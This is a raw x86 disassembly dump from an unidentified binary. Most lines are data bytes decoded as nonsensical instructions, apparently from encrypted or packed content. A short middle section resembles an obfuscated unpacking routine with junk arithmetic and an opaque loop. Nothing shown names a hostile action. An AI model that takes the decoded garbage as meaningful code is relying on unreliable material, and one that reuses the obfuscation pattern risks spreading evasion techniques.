  40db0c:	add    eax,0x67ab0853
  40db11:	push   edi
  40db12:	xor    eax,DWORD PTR [ecx]
  40db14:	fwait
  40db15:	rcr    DWORD PTR [ebx+ebp*2+0x3f],cl
  40db19:	(bad)  
  40db1a:	adc    DWORD PTR [edi-0x4cd214b4],ecx
  40db20:	push   esi
  40db21:	xchg   DWORD PTR [ebx],esp
  40db23:	lds    esp,FWORD PTR [ebx]
  40db25:	xor    al,0x3c
  40db27:	dec    ebx
  40db28:	loop   0x40db6c
  40db2a:	dec    esi
  40db2b:	hlt    
  40db2c:	push   esi
  40db2d:	mov    WORD PTR [edx-0x68],gs
  40db30:	pop    ds
  40db31:	mov    ch,BYTE PTR ds:0x4691842
  40db37:	imul   ecx,ecx,0xeced9de9
  40db3d:	aad    0x9d
  40db3f:	pop    ecx
  40db40:	jg     0x40db85
  40db42:	adc    esi,DWORD PTR [ecx+0x4a929c67]
  40db48:	inc    ecx
  40db49:	mov    ebp,0xbf41cbf4
  40db4e:	lock sub al,0x8e
  40db51:	sbb    DWORD PTR [edx],ecx
  40db53:	mov    ds:0x948e47d7,eax
  40db58:	push   esp
  40db59:	stc    
  40db5a:	int    0x2b
  40db5c:	out    dx,al
  40db5d:	dec    esi
  40db5e:	pop    eax
  40db5f:	loopne 0x40dbde
  40db61:	mov    al,ds:0xac6ed77b
  40db66:	xor    DWORD PTR ss:[ebx-0x23d01eec],eax
  40db6d:	popa   
  40db6e:	adc    eax,0x28c83d85
  40db73:	fs jge 0x40db70
  40db76:	inc    edx
  40db77:	xlat   BYTE PTR ds:[ebx]
  40db78:	test   eax,0xb479291d
  40db7d:	ja     0x40db3c
  40db7f:	push   0x64
  40db81:	popf   
  40db82:	mov    es,WORD PTR [ebp-0x4fe8268]
  40db88:	fcmovnbe st,st(4)
  40db8a:	adc    dl,BYTE PTR [ecx+0xd]
  40db8d:	sbb    BYTE PTR [edx],0xac
  40db90:	push   edx
  40db91:	int3   
  40db92:	dec    ecx
  40db93:	and    ebp,ebp
  40db95:	mov    esi,0x9ce1915a
  40db9a:	ret    
  40db9b:	fldcw  WORD PTR [ebx+0x292dcf71]
  40dba1:	push   0xffffff8e
  40dba3:	hlt    
  40dba4:	test   DWORD PTR [eax],0xd43c750f
  40dbaa:	mov    ebp,0x64b13f08
  40dbaf:	cmc    
  40dbb0:	call   0x4299b865
  40dbb5:	fisttp QWORD PTR [esi-0x9]
  40dbb8:	add    ecx,DWORD PTR [eax]
  40dbba:	stos   DWORD PTR es:[edi],eax
  40dbbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbbc:	daa    
  40dbbd:	push   es
  40dbbe:	dec    edx
  40dbbf:	cmp    al,0x3f
  40dbc1:	or     BYTE PTR [edi+eax*1+0x5fa15735],bh
  40dbc8:	in     eax,0x67
  40dbca:	sub    ch,BYTE PTR [esp+ebx*1+0x19]
  40dbce:	fimul  WORD PTR [ecx+eax*4-0x73]
  40dbd2:	dec    edx
  40dbd3:	setns  BYTE PTR [esi-0x1c0c61be]
  40dbda:	outs   dx,BYTE PTR ds:[esi]
  40dbdb:	test   esi,0xe57166de
  40dbe1:	pop    ebx
  40dbe2:	sub    esp,edi
  40dbe4:	outs   dx,BYTE PTR ds:[esi]
  40dbe5:	or     DWORD PTR [edi-0x70],ebx
  40dbe8:	outs   dx,BYTE PTR ds:[esi]
  40dbe9:	sub    al,0x42
  40dbeb:	outs   dx,BYTE PTR ds:[esi]
  40dbec:	and    edi,DWORD PTR [eax-0x61]
  40dbef:	mov    ds:0xc333eb3c,eax
  40dbf4:	xor    DWORD PTR [esi+0x64043438],eax
  40dbfa:	call   0x8514a9cc
  40dbff:	fcomp  QWORD PTR [esi]
  40dc01:	lea    edi,[edi]
  40dc03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc04:	inc    ecx
  40dc05:	outs   dx,BYTE PTR ds:[esi]
  40dc06:	xchg   esp,eax
  40dc07:	(bad)  
  40dc08:	sti    
  40dc09:	mov    WORD PTR [ebp+0x70e5d182],cs
  40dc0f:	sbb    edi,DWORD PTR [edx-0x3c091f1a]
  40dc15:	scas   al,BYTE PTR es:[edi]
  40dc16:	dec    ecx
  40dc17:	cmp    DWORD PTR [edi+ebp*4-0x4f],esi
  40dc1b:	in     al,dx
  40dc1c:	push   ebp
  40dc1d:	inc    esp
  40dc1e:	add    eax,DWORD PTR [edi+0x3c85ae47]
  40dc24:	fsub   DWORD PTR [edi+0x2b7a199c]
  40dc2a:	mov    esp,0x87ad4f1
  40dc2f:	or     eax,0x268116bc
  40dc34:	iret   
  40dc35:	jne    0x40dbfe
  40dc37:	lahf   
  40dc38:	pushf  
  40dc39:	and    eax,0xa9c2fabd
  40dc3e:	scas   al,BYTE PTR es:[edi]
  40dc3f:	cmp    BYTE PTR [ebx-0x7d3a62df],0xff
  40dc46:	sub    al,0x22
  40dc48:	xor    ah,dh
  40dc4a:	(bad)  
  40dc4b:	fdivr  QWORD PTR [edx]
  40dc4d:	dec    esp
  40dc4e:	sahf   
  40dc4f:	xlat   BYTE PTR ds:[ebx]
  40dc50:	iret   
  40dc51:	(bad)  
  40dc52:	jns    0x40dbd4
  40dc54:	or     esp,ecx
  40dc56:	fist   WORD PTR [eax+0x33b5a5bb]
  40dc5c:	mov    esi,DWORD PTR [esi]
  40dc5e:	xchg   edi,eax
  40dc5f:	pop    ecx
  40dc60:	stc    
  40dc61:	pusha  
  40dc62:	inc    ecx
  40dc63:	jmp    0x40dc3a
  40dc65:	ds xor cl,dl
  40dc68:	push   0xee1d16a
  40dc6d:	scas   al,BYTE PTR es:[edi]
  40dc6e:	push   ecx
  40dc6f:	dec    edx
  40dc70:	call   0x8eafabef
  40dc75:	dec    ebx
  40dc76:	xor    al,0xe1
  40dc78:	out    dx,eax
  40dc79:	xchg   ch,ah
  40dc7b:	retf   
  40dc7c:	cwde   
  40dc7d:	std    
  40dc7e:	mov    ah,0xd8
  40dc80:	xchg   ecx,ebx
  40dc82:	test   eax,0x1fd9d409
  40dc87:	fimul  WORD PTR [esi-0x30]
  40dc8a:	adc    edx,DWORD PTR [eax]
  40dc8c:	sbb    al,0xe3
  40dc8e:	stos   BYTE PTR es:[edi],al
  40dc8f:	mov    ebx,0x3ba4bada
  40dc94:	xchg   ecx,eax
  40dc95:	push   ss
  40dc96:	pusha  
  40dc97:	shr    DWORD PTR [edx],cl
  40dc99:	stos   BYTE PTR es:[edi],al
  40dc9a:	mov    ah,0x91
  40dc9c:	je     0x40dce9
  40dc9e:	mov    ebp,0x3c12cf3
  40dca3:	ror    DWORD PTR [edx+0x38],cl
  40dca6:	mov    edx,0xd295d06b
  40dcab:	nop
  40dcac:	cmc    
  40dcad:	or     dl,BYTE PTR [ebp+ecx*2+0x64f49e61]
  40dcb4:	jne    0x40dc46
  40dcb6:	cld    
  40dcb7:	ss popf 
  40dcb9:	fistp  WORD PTR [edi+0x4e8bde41]
  40dcbf:	lods   al,BYTE PTR ds:[esi]
  40dcc0:	jmp    0xcc88:0xbbdf23a7
  40dcc7:	in     al,dx
  40dcc8:	dec    ecx
  40dcc9:	dec    eax
  40dcca:	iret   
  40dccb:	push   ds
  40dccc:	pop    esp
  40dccd:	scas   al,BYTE PTR es:[edi]
  40dcce:	fcmovne st,st(2)
  40dcd0:	clc    
  40dcd1:	or     ecx,DWORD PTR ds:0xe122403f
  40dcd7:	sbb    edx,0x5e
  40dcda:	aam    0xe3
  40dcdc:	(bad)  
  40dcdd:	in     eax,0x53
  40dcdf:	pop    esi
  40dce0:	cmp    esi,DWORD PTR [ebx]
  40dce2:	mov    ah,0x73
  40dce4:	not    DWORD PTR [esi+ebx*1]
  40dce7:	jge    0x40dd3a
  40dce9:	cli    
  40dcea:	xchg   bh,al
  40dcec:	and    dl,dl
  40dcee:	pop    ecx
  40dcef:	shl    DWORD PTR [edi-0x409e6392],1
  40dcf5:	mov    al,BYTE PTR [ebp-0x22834f22]
  40dcfb:	dec    edx
  40dcfc:	xchg   ecx,eax
  40dcfd:	xor    cl,BYTE PTR [ecx+0x56]
  40dd00:	test   DWORD PTR [si+0x778a],ebp
  40dd05:	sbb    eax,0xd3aa30d9
  40dd0a:	(bad)  [ebp-0x76df2ad3]
  40dd10:	or     bh,BYTE PTR [esp+edx*8+0x25]
  40dd14:	push   esi
  40dd15:	ss mov ch,0x8a
  40dd18:	xor    edx,DWORD PTR [ecx-0x1668ebd4]
  40dd1e:	scas   eax,DWORD PTR es:[edi]
  40dd1f:	scas   eax,DWORD PTR es:[edi]
  40dd20:	jmp    0xee74:0x42fbea88
  40dd27:	jne    0x40dd36
  40dd29:	les    ebx,FWORD PTR [ebx+ecx*1+0x46]
  40dd2d:	lods   al,BYTE PTR ds:[esi]
  40dd2e:	das    
  40dd2f:	test   DWORD PTR [edx-0x67],ebx
  40dd32:	enter  0x5e84,0xcf
  40dd36:	pslld  mm6,QWORD PTR [ecx]
  40dd39:	cwde   
  40dd3a:	dec    eax
  40dd3b:	imul   edi,DWORD PTR [ecx-0x7b],0xf362028d
  40dd42:	and    BYTE PTR [ebx],0x4d
  40dd45:	jecxz  0x40dd67
  40dd47:	push   edi
  40dd48:	mov    ds:0x5c3f4a2b,eax
  40dd4d:	jmp    DWORD PTR [ecx+0x4a]
  40dd50:	cmp    eax,eax
  40dd52:	cli    
  40dd53:	or     esp,DWORD PTR [ebp-0x6d]
  40dd56:	les    edi,FWORD PTR [eax+0x13]
  40dd59:	mov    ebx,0x86687752
  40dd5e:	sahf   
  40dd5f:	xlat   BYTE PTR ds:[ebx]
  40dd60:	enter  0xdaa3,0x4f
  40dd64:	stos   BYTE PTR es:[edi],al
  40dd65:	xchg   esi,eax
  40dd66:	jmp    0x40dd3f
  40dd68:	aad    0x60
  40dd6a:	clc    
  40dd6b:	pop    edi
  40dd6c:	neg    DWORD PTR [edi+ebp*2]
  40dd6f:	inc    eax
  40dd70:	sahf   
  40dd71:	xlat   BYTE PTR ds:[ebx]
  40dd72:	mov    ebp,0x35d9f179
  40dd77:	in     eax,dx
  40dd78:	addr16 push edi
  40dd7a:	ret    
  40dd7b:	loop   0x40ddaf
  40dd7d:	sbb    BYTE PTR [eax],cl
  40dd7f:	scas   al,BYTE PTR es:[edi]
  40dd80:	fwait
  40dd81:	repz jb 0x40dd87
  40dd84:	jne    0x40dddb
  40dd86:	aam    0x3a
  40dd88:	sbb    BYTE PTR [eax-0x5a],0xdc
  40dd8c:	inc    eax
  40dd8d:	stc    
  40dd8e:	loopne 0x40dd12
  40dd90:	pop    ds
  40dd91:	inc    edi
  40dd92:	cli    
  40dd93:	sbb    eax,0x9ba4a023
  40dd98:	push   eax
  40dd99:	lahf   
  40dd9a:	outs   dx,DWORD PTR ds:[esi]
  40dd9b:	rcr    DWORD PTR [ebp+0x5f59f85e],1
  40dda1:	or     eax,0x8c4c993a
  40dda6:	shr    al,cl
  40dda8:	jo     0x40dd64
  40ddaa:	or     DWORD PTR [ebx],0x6216c738
  40ddb0:	fst    DWORD PTR [edi+0x12]
  40ddb3:	jnp    0x40dd8b
  40ddb5:	xor    bl,BYTE PTR [ecx-0x3db1be08]
  40ddbb:	jns    0x40de32
  40ddbd:	(bad)  [ecx]
  40ddbf:	cdq    
  40ddc0:	or     BYTE PTR [ebx-0x9],cl
  40ddc3:	sub    eax,edx
  40ddc5:	sub    eax,0xc916c23b
  40ddca:	xor    al,BYTE PTR [edx-0x3a824000]
  40ddd0:	cld    
  40ddd1:	adc    BYTE PTR [eax],0xc7
  40ddd4:	fidiv  WORD PTR [edx+ebx*1+0x2989400]
  40dddb:	xor    al,0x8d
  40dddd:	data16 in al,0xa5
  40dde0:	mov    bl,0x2b
  40dde2:	dec    esp
  40dde3:	jne    0x40ddff
  40dde5:	test   al,dh
  40dde7:	loop   0x40dd6d
  40dde9:	adc    bl,BYTE PTR [ebx]
  40ddeb:	lods   al,BYTE PTR ds:[esi]
  40ddec:	hlt    
  40dded:	mov    edi,0x1259639c
  40ddf2:	adc    edi,DWORD PTR [esi+0x4b1aa28e]
  40ddf8:	inc    ecx
  40ddf9:	dec    ebp
  40ddfa:	bound  edi,QWORD PTR [esi+0x52091c57]
  40de00:	sbb    al,0x72
  40de02:	cmp    al,bh
  40de04:	inc    ebp
  40de05:	shl    DWORD PTR [ebp-0x7c1891c8],1
  40de0b:	in     al,0xee
  40de0d:	pop    ebp
  40de0e:	push   eax
  40de0f:	les    ecx,FWORD PTR [edx+0x7de490ff]
  40de15:	call   0xe7dd:0xf01d0e04
  40de1c:	popa   
  40de1d:	call   0x4661:0xdb277d6a
  40de24:	xlat   BYTE PTR ds:[ebx]
  40de25:	shr    BYTE PTR [edi+0x329f7cba],0x6b
  40de2c:	add    DWORD PTR [edi],edx
  40de2e:	pop    ss
  40de2f:	mov    dl,0x39
  40de31:	mov    eax,ds:0x3915a46f
  40de36:	dec    edi
  40de37:	add    DWORD PTR [ebp+0x20],ebx
  40de3a:	cmc    
  40de3b:	aaa    
  40de3c:	jmp    0x9072:0x181aed7d
  40de43:	test   DWORD PTR [ebx+0x3e],edi
  40de46:	and    al,0x2
  40de48:	jecxz  0x40de97
  40de4a:	ins    DWORD PTR es:[edi],dx
  40de4b:	jp     0x40deba
  40de4d:	pop    ebp
  40de4e:	cmp    al,0x89
  40de50:	mov    eax,DWORD PTR [ebp-0x4]
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0xf7
  40dfd4:	ss out dx,eax
  40dfd6:	enter  0xd2c5,0x62
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx-0x77]
  40dfe0:	es data16 ins BYTE PTR es:[edi],dx
  40dfe3:	mov    al,ds:0x1c0a0d37
  40dfe8:	dec    esp
  40dfe9:	xchg   DWORD PTR [esi-0x47],eax
  40dfec:	lahf   
  40dfed:	pop    edx
  40dfee:	enter  0x5bdd,0x57
  40dff2:	(bad)  
  40dff3:	(bad)  [ebx]
  40dff5:	add    eax,0xe8506385
  40dffa:	and    dh,BYTE PTR [ebp+0x46867c53]
  40e000:	lds    ecx,FWORD PTR [ebx+0x3bb18f3e]
  40e006:	cmp    al,0xdd
  40e008:	stc    
  40e009:	sub    DWORD PTR [edx-0x16],eax
  40e00c:	inc    ecx
  40e00d:	out    0xa0,eax
  40e00f:	ret    
  40e010:	jae    0x40e04c
  40e012:	inc    ecx
  40e013:	aad    0x20
  40e015:	fsubr  DWORD PTR [edx-0x4685fa09]
  40e01b:	addr16 mov eax,0xdd70b5c9
  40e021:	sub    ah,ch
  40e023:	icebp  
  40e024:	add    bh,BYTE PTR [ebx-0x3bae548e]
  40e02a:	ins    BYTE PTR es:[edi],dx
  40e02b:	call   0xeae0f904
  40e030:	leave  
  40e031:	(bad)  
  40e032:	mov    bl,0xa8
  40e034:	mov    DWORD PTR [ebx+0x37],esp
  40e037:	das    
  40e038:	enter  0x5958,0x5e
  40e03c:	push   ds
  40e03d:	in     eax,0xd0
  40e03f:	push   edi
  40e040:	pusha  
  40e041:	test   ch,ah
  40e043:	pop    ebp
  40e044:	jns    0x40dfeb
  40e046:	adc    bl,BYTE PTR [esi+0x68]
  40e049:	mov    eax,0xc325482e
  40e04e:	aam    0x56
  40e050:	mov    ds:0xdb016361,eax
  40e055:	jne    0x40e043
  40e057:	xchg   ebp,eax
  40e058:	out    dx,eax
  40e059:	fmul   st,st(6)
  40e05b:	jns    0x40e0b6
  40e05d:	shl    dl,1
  40e05f:	push   ebp
  40e060:	mov    ebp,0x83d9054f
  40e065:	pusha  
  40e066:	das    
  40e067:	es sahf 
  40e069:	fimul  DWORD PTR [eax-0x4a]
  40e06c:	add    DWORD PTR [edi+0xb],esi
  40e06f:	lds    ebx,FWORD PTR [edi]
  40e071:	sub    DWORD PTR [esi+ebx*1+0x76],edx
  40e075:	cdq    
  40e076:	and    DWORD PTR [ecx+edi*2-0xbaf987f],esp
  40e07d:	or     bl,BYTE PTR [edx]
  40e07f:	dec    esp
  40e080:	or     al,0x39
  40e082:	in     eax,dx
  40e083:	vaddps ymm6,ymm6,YMMWORD PTR [esi-0x6a51a0ab]
  40e08b:	or     dl,al
  40e08d:	or     esp,eax
  40e08f:	lea    esp,[esi]
  40e091:	xor    eax,0xcfd08b04
  40e097:	and    DWORD PTR [esi],ebp
  40e099:	das    
  40e09a:	mov    cl,0x63
  40e09c:	fist   DWORD PTR [ebx+0x4f]
  40e09f:	outs   dx,DWORD PTR ds:[esi]
  40e0a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0a1:	or     cl,cl
  40e0a3:	mov    esi,0x8518e15c
  40e0a8:	mov    bl,0x67
  40e0aa:	leave  
  40e0ab:	sar    DWORD PTR [eax],1
  40e0ad:	lahf   
  40e0ae:	fs (bad) 
  40e0b0:	into   
  40e0b1:	int3   
  40e0b2:	cmp    esi,DWORD PTR [esi+edx*4-0x15]
  40e0b6:	adc    al,0x88
  40e0b8:	mov    esp,0x6f15d67f
  40e0bd:	fstp   DWORD PTR [ebx]
  40e0bf:	xor    ecx,DWORD PTR [edx-0x52fb543f]
  40e0c5:	call   0xbd2b:0xcf0563de
  40e0cc:	jmp    0x3ae71914
  40e0d1:	or     eax,edi
  40e0d3:	xchg   edx,eax
  40e0d4:	sahf   
  40e0d5:	dec    esi
  40e0d6:	jbe    0x40e137
  40e0d8:	retf   
  40e0d9:	xchg   BYTE PTR [ebx-0x76],dl
  40e0dc:	xchg   ecx,eax
  40e0dd:	(bad)  
  40e0de:	dec    DWORD PTR [eax+0x5d]
  40e0e1:	push   edx
  40e0e2:	fld    DWORD PTR [edi+0x3d]
  40e0e5:	push   ss
  40e0e6:	push   esi
  40e0e7:	jg     0x40e146
  40e0e9:	adc    bl,BYTE PTR [edi-0x132de53c]
  40e0ef:	and    esi,DWORD PTR ds:0xb6a2a62f
  40e0f5:	mov    BYTE PTR [ebp-0x5d9a56e5],ah
  40e0fb:	sbb    eax,0xd02fbde
  40e100:	cli    
  40e101:	ret    
  40e102:	out    0xdd,al
  40e104:	jge    0x40e0a8
  40e106:	lods   al,BYTE PTR ds:[esi]
  40e107:	std    
  40e108:	push   es
  40e109:	and    al,0x7b
  40e10b:	cli    
  40e10c:	cmp    al,0x4
  40e10e:	popf   
  40e10f:	retf   0xa804
  40e112:	inc    edi
  40e113:	jno    0x40e16d
  40e115:	mov    ah,0xc8
  40e117:	ss out dx,al
  40e119:	test   BYTE PTR [ecx-0x44],ch
  40e11c:	test   BYTE PTR [ebx],0x71
  40e11f:	and    eax,0x83781c02
  40e124:	push   0x21
  40e126:	pop    edx
  40e127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e128:	imul   ecx
  40e12a:	cdq    
  40e12b:	mov    eax,0x944b1d85
  40e130:	inc    esp
  40e131:	mov    ebp,0xa2b6c9e8
  40e136:	lea    ebp,[esi]
  40e138:	push   ds
  40e139:	pop    edx
  40e13a:	pushf  
  40e13b:	jmp    0xe129:0x8362acb8
  40e142:	xor    bl,BYTE PTR [eax+0x249d0b46]
  40e148:	xor    ebx,DWORD PTR [esp+edx*4+0x47324f73]
  40e14f:	jo     0x40e11a
  40e151:	xchg   DWORD PTR [edi],edx
  40e153:	hlt    
  40e154:	neg    DWORD PTR ss:[eax+ebp*1]
  40e158:	add    al,0x24
  40e15a:	cld    
  40e15b:	pop    ebx
  40e15c:	retf   
  40e15d:	push   cs
  40e15e:	inc    ebx
  40e15f:	cmp    BYTE PTR [edx+0x13e05e74],bh
  40e165:	clc    
  40e166:	add    edx,DWORD PTR [esi+edx*4-0x6c003d74]
  40e16d:	add    DWORD PTR [esi],edi
  40e16f:	lods   eax,DWORD PTR ds:[esi]
  40e170:	cmp    ebp,DWORD PTR [esi+edx*8+0x53f58fdf]
  40e177:	scas   eax,DWORD PTR es:[edi]
  40e178:	out    0x9a,eax
  40e17a:	scas   eax,DWORD PTR es:[edi]
  40e17b:	add    BYTE PTR [ecx+edx*2],bl
  40e17e:	mov    dl,0x41
  40e180:	scas   al,BYTE PTR es:[edi]
  40e181:	xor    al,bl
  40e183:	fdivr  DWORD PTR [eax+0x6c]
  40e186:	mov    ecx,0x43030eeb
  40e18b:	sbb    eax,edi
  40e18d:	push   esi
  40e18e:	sbb    ah,cl
  40e190:	mov    esi,0x748853ca
  40e195:	or     al,0xcb
  40e197:	sbb    ebx,DWORD PTR [esi-0x6b]
  40e19a:	retf   0xd190
  40e19d:	inc    ebx
  40e19e:	pop    esp
  40e19f:	mov    edi,0x856f3516
  40e1a4:	test   BYTE PTR [ebx-0x3b],ch
  40e1a7:	cld    
  40e1a8:	(bad)  
  40e1a9:	jg     0x40e184
  40e1ab:	or     ebx,ecx
  40e1ad:	arpl   WORD PTR [edx-0x52],si
  40e1b0:	ja     0x40e19a
  40e1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1b3:	mov    ds:0xae9cc2de,al
  40e1b8:	mov    edx,0x1fa9dd83
  40e1bd:	ficom  WORD PTR [esi+0x27]
  40e1c0:	mov    ebp,0xe7c72fbc
  40e1c5:	push   ebp
  40e1c6:	daa    
  40e1c7:	dec    ebx
  40e1c8:	shr    BYTE PTR [ecx-0x688cae31],1
  40e1ce:	pop    es
  40e1cf:	cmp    BYTE PTR [edx+eax*2-0x79],ch
  40e1d3:	and    BYTE PTR [ebx],bh
  40e1d5:	jb     0x40e252
  40e1d7:	dec    ecx
  40e1d8:	adc    bl,0x8a
  40e1db:	cs xor esi,ebp
  40e1de:	(bad)  
  40e1df:	or     al,0x2d
  40e1e1:	arpl   WORD PTR [ebx+0x429e4de4],bx
  40e1e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1e8:	jp     0x40e263
  40e1ea:	outs   dx,BYTE PTR ds:[esi]
  40e1eb:	sbb    bh,BYTE PTR [edx+0x1317f69f]
  40e1f1:	and    edi,DWORD PTR [ebx+0x4d868bfc]
  40e1f7:	xor    al,0x7e
  40e1f9:	dec    eax
  40e1fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1fb:	call   0xe020:0x88c5edeb
  40e202:	pop    edx
  40e203:	pop    es
  40e204:	add    eax,0x22d53fc9
  40e209:	jne    0x40e1f6
  40e20b:	xlat   BYTE PTR ds:[ebx]
  40e20c:	cwde   
  40e20d:	pop    edx
  40e20e:	retf   0x23c8
  40e211:	push   edi
  40e212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e213:	(bad)  
  40e214:	sbb    ah,bh
  40e216:	push   esp
  40e217:	xchg   edx,eax
  40e218:	ss scas al,BYTE PTR es:[edi]
  40e21a:	aad    0xaa
  40e21c:	add    eax,0x916ff76a
  40e221:	push   0x71
  40e223:	shl    BYTE PTR [esp+edi*8+0x754747d2],0xd4
  40e22b:	inc    edx
  40e22c:	dec    ecx
  40e22d:	inc    edi
  40e22e:	push   cs
  40e22f:	daa    
  40e230:	test   DWORD PTR [edi-0x4e],edi
  40e233:	in     eax,dx
  40e234:	pop    ss
  40e235:	push   cs
  40e236:	dec    esp
  40e237:	js     0x40e212
  40e239:	cmp    ebx,0x6bc55bea
  40e23f:	mov    ds:0xf494422e,al
  40e244:	lahf   
  40e245:	into   
  40e246:	lods   eax,DWORD PTR ds:[esi]
  40e247:	xor    al,0xb5
  40e249:	enter  0x8090,0x9f
  40e24d:	(bad)  
  40e24e:	(bad)  
  40e24f:	std    
  40e250:	ret    0x5c89
  40e253:	in     al,dx
  40e254:	mov    cl,0x39
  40e256:	push   cs
  40e257:	nop
  40e258:	fsubr  DWORD PTR [ecx+0x4f]
  40e25b:	xchg   DWORD PTR [edi],ebp
  40e25d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e25e:	loopne 0x40e225
  40e260:	xchg   esi,eax
  40e261:	fist   WORD PTR [edi]
  40e263:	adc    DWORD PTR [edi-0x6affc2ce],ebp
  40e269:	hlt    
  40e26a:	push   ecx
  40e26b:	and    BYTE PTR fs:0x1aaf190f,bl
  40e272:	cmp    al,0x67
  40e274:	retf   0xed8b
  40e277:	retf   0xe80f
  40e27a:	ror    DWORD PTR [ecx-0x20],cl
  40e27d:	mov    ds:0x56e26715,al
  40e282:	fimul  WORD PTR [ebp-0x6f]
  40e285:	sub    DWORD PTR [ecx],0xfc8d9be3
  40e28b:	jle    0x40e2b9
  40e28d:	in     al,0x2b
  40e28f:	loope  0x40e2ad
  40e291:	es pop ebx
  40e293:	adc    edx,ebp
  40e295:	je     0x40e2ab
  40e297:	rcr    BYTE PTR [edi-0x26aec4b8],1
  40e29d:	jmp    0x9838:0x736b04d6
  40e2a4:	adc    al,BYTE PTR [edx-0x2efcbe2f]
  40e2aa:	jle    0x40e264
  40e2ac:	pusha  
  40e2ad:	xor    ebp,DWORD PTR [ebx-0x734f181a]
  40e2b3:	push   ecx
  40e2b4:	stos   BYTE PTR es:[edi],al
  40e2b5:	or     BYTE PTR [ebp+0x36],0xb4
  40e2b9:	pop    edx
  40e2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2bb:	xchg   esi,eax
  40e2bc:	pop    edx
  40e2bd:	cmp    eax,eax
  40e2bf:	lock in eax,dx
  40e2c1:	pop    ss
  40e2c2:	sti    
  40e2c3:	mov    ebx,0x83ea9a6d
  40e2c8:	into   
  40e2c9:	sub    cl,dl
